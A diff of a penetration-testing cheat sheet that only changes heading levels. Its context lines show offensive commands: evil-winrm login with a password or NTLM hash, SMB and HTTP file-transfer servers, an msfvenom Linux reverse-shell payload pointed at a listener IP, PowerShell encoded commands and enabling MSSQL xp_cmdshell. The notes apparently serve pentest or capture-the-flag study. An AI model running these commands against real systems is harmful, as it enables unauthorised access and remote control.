@@ -1,4 +1,4 @@
-## Remote Access
+# Remote Access
 ```
 evil-winrm -i {IP} -u {username} -p {password/NTLM hash}
 
@@ -11,14 +11,14 @@ download {remote_filename} {destination_filename (optional)}
 
 # Hosting Servers
 
-# HTTP server
+## HTTP server
 ```
 python3 -m http.server 80
 ```
 > make sure to be in the directory of the server
 > --directory can be used
 
-# SMB server
+## SMB server
 ```
 sudo smbserver {share name} -username user -password password
 
@@ -27,7 +27,7 @@ net use \\{IP}\{share name} /user:user password
 ```
 > -smb2support might be needed for some windows
 
-# SMB 
+## SMB 
 ```
 smbclient -L //(IP)/{share name} 
 get > download {filename}
@@ -67,7 +67,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >rever
 > linux
 
 
-# Powershell 
+## Powershell 
 
 # Downloading files
 ```
@@ -97,7 +97,7 @@ powershell.exe -e
 > checking OS architecture 
 
 
-# MSSQL
+## MSSQL
 ```
 enable_xp_cmdshell
 EXEC xp+cmdshell '{command}'
